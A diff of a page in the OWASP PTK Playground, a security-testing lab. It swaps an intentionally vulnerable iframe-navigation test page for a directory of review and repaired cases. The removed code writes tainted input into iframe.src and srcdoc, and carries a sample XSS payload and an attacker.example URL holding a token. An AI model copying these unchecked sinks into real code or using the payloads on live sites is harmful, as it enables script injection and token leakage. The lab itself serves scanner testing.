@@ -2,88 +2,60 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>IAST IFrame Navigation Sinks</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body { font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 24px; background: #0f172a; color: #e2e8f0; }
-    h1 { margin-top: 0; }
-    .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
-    label { display: block; margin: 8px 0 4px; color: #cbd5e1; }
-    input, textarea, button { width: 100%; border-radius: 10px; border: 1px solid #1f2937; padding: 10px; background: #0b1220; color: #e2e8f0; }
-    textarea { min-height: 90px; }
-    button { cursor: pointer; font-weight: 600; background: #2563eb; border: none; margin-top: 8px; }
-    button:hover { background: #1d4ed8; }
-    .note { color: #94a3b8; font-size: 0.9rem; }
-    iframe { width: 100%; min-height: 180px; border: 1px dashed #1f2937; border-radius: 12px; background: #0b1220; }
-  
-    .back-link {
-      display: inline-block;
-      margin-bottom: 12px;
-      color: #93c5fd;
-      text-decoration: none;
-      font-weight: 600;
-    }
-    .back-link:hover {
-      text-decoration: underline;
-    }
-  </style>
+  <title>IFrame Navigation Module · IAST · OWASP PTK Playground</title>
+  <meta name="description" content="Focused IAST review and repaired cases for IFrame Navigation Module.">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; style-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'none'; form-action 'self'">
+  <link rel="stylesheet" href="../assets/css/playground.css">
 </head>
-<body>
-  <a class="back-link" href="index.html">← Back to index</a>
-  <h1>IAST IFrame Navigation Module</h1>
-  <p class="note">Targets <code>iframe.src</code> and <code>iframe.srcdoc</code> sinks used by <code>iast_iframe_navigation</code>. Populate the fields with tainted routes or HTML, prime sources, then trigger the buttons.</p>
-
-  <div class="card">
-    <label for="url">IFrame URL (tainted)</label>
-    <input id="url" type="text" placeholder="https://attacker.example/app#token=TAINT">
-    <label for="srcdoc">IFrame srcdoc (tainted HTML)</label>
-    <textarea id="srcdoc" placeholder="&lt;img src=x onerror=alert('iframe')&gt;"></textarea>
-    <button id="prime">Prime taint sources</button>
-    <p class="note">Taint is read from ?url=..., ?srcdoc=..., the hash fragment, or the inputs above when primed.</p>
-  </div>
-
-  <div class="card">
-    <iframe id="preview" title="IFrame preview"></iframe>
-    <button id="btn-src">iframe.src = URL</button>
-    <button id="btn-srcdoc">iframe.srcdoc = HTML</button>
-  </div>
-
-  <script>
-    function getParam(name) {
-      const params = new URLSearchParams(location.search);
-      return params.get(name) || '';
-    }
-
-    function getHashPayload() {
-      return location.hash ? decodeURIComponent(location.hash.slice(1)) : '';
-    }
-
-    function primeSources(valueA, valueB) {
-      const combined = [valueA, valueB, getHashPayload()].filter(Boolean).join(' ');
-      if (!combined) return;
-      document.cookie = 'iast_payload=' + encodeURIComponent(combined) + '; path=/';
-      localStorage.setItem('iast_payload', combined);
-      sessionStorage.setItem('iast_payload', combined);
-      window.name = combined;
-    }
-
-    const urlField = document.getElementById('url');
-    const srcdocField = document.getElementById('srcdoc');
-    urlField.value = getParam('url') || 'https://attacker.example/embed?token=TAINT';
-    srcdocField.value = getParam('srcdoc') || "<img src=x onerror=alert('iframe')>";
-
-    document.getElementById('prime').onclick = () => {
-      primeSources(urlField.value, srcdocField.value);
-      alert('Taint sources primed with IFrame payloads.');
-    };
-
-    document.getElementById('btn-src').onclick = () => {
-      document.getElementById('preview').src = urlField.value;
-    };
-
-    document.getElementById('btn-srcdoc').onclick = () => {
-      document.getElementById('preview').srcdoc = srcdocField.value;
-    };
-  </script>
+<body class="engine-page engine-page--iast family-directory-page" data-family-directory="iast/iast_iframe_navigation.html">
+  <a class="skip-link" href="#cases">Skip to cases</a>
+  <header class="site-header">
+    <div class="site-header__inner">
+      <a class="brand" href="../"><span class="brand__mark" aria-hidden="true">PTK</span><span>OWASP PTK Playground</span></a>
+      <nav class="site-nav" aria-label="Playground navigation"><a href="../play/">Play</a><a href="../explore/?engine=IAST">Explore IAST</a></nav>
+    </div>
+  </header>
+  <main class="page-shell">
+    <section class="engine-hero family-hero">
+      <nav class="breadcrumbs" aria-label="Breadcrumb"><a href="../">Playground</a><span aria-hidden="true">/</span><a href="./">IAST</a><span aria-hidden="true">/</span><span>IFrame Navigation Module</span></nav>
+      <p class="eyebrow">IAST case family</p>
+      <h1>IFrame Navigation Module</h1>
+      <p class="engine-hero__lede">Trigger one live browser runtime flow at a time and compare it with the paired repaired behavior.</p>
+      <div class="family-hero__facts" aria-label="Family summary"><span><strong>2</strong> focused cases</span><span><strong>2</strong> repaired controls</span></div>
+    </section>
+    <aside class="notice notice--engine" aria-label="How to use this family">
+      <span class="notice__icon" aria-hidden="true">↯</span>
+      <p><strong>Choose a single case.</strong> Start the relevant PTK engine, open its review target and perform the prepared action when one is shown. Use the repaired control to verify that normal behavior remains while the unsafe boundary is removed.</p>
+    </aside>
+    <section id="cases" class="section" aria-labelledby="cases-title">
+      <div class="section-heading"><div><p class="eyebrow">Focused targets</p><h2 id="cases-title">One page per unique case</h2></div></div>
+      <div class="family-case-grid">
+      <article class="family-case-card" data-challenge-id="iast.atomic.iast-iast-iframe-navigation.btn-src">
+        <div class="family-case-card__meta"><span>Case 01</span><span>iframe navigation</span></div>
+        <h2>iframe.src = URL</h2>
+        <p>Run this browser-security case independently, then compare it with the behavior-preserving repaired control.</p>
+        <div class="button-row">
+          <a class="button" href="../atomic/iast/iast-iast-iframe-navigation/btn-src/review/">Open review target</a>
+          <a class="button button--secondary" href="../atomic/iast/iast-iast-iframe-navigation/btn-src/fixed/">Open repaired control</a>
+        </div>
+      </article>
+      <article class="family-case-card" data-challenge-id="iast.atomic.iast-iast-iframe-navigation.btn-srcdoc">
+        <div class="family-case-card__meta"><span>Case 02</span><span>iframe navigation</span></div>
+        <h2>iframe.srcdoc = HTML</h2>
+        <p>Run this browser-security case independently, then compare it with the behavior-preserving repaired control.</p>
+        <div class="button-row">
+          <a class="button" href="../atomic/iast/iast-iast-iframe-navigation/btn-srcdoc/review/">Open review target</a>
+          <a class="button button--secondary" href="../atomic/iast/iast-iast-iframe-navigation/btn-srcdoc/fixed/">Open repaired control</a>
+        </div>
+      </article>
+      </div>
+    </section>
+    <aside class="advanced-lab-panel">
+      <div><p class="eyebrow">Compatibility lab</p><h2>Need every historical case on one page?</h2><p>The combined lab is retained for regression and scanner-compatibility work. It is deliberately denser than the focused playground journey.</p></div>
+      <a class="button button--secondary" href="./iast_iframe_navigation.advanced.html">Open Advanced combined lab</a>
+    </aside>
+  </main>
+  <footer class="site-footer"><div class="site-footer__inner"><p>IAST family directory · scanner-neutral review and repaired targets.</p><nav aria-label="Project links"><a href="../play/">Play</a><a href="../explore/?engine=IAST">Explore IAST</a><a href="https://owasp.org/www-project-penetration-testing-kit/">OWASP PTK</a></nav></div></footer>
 </body>
 </html>
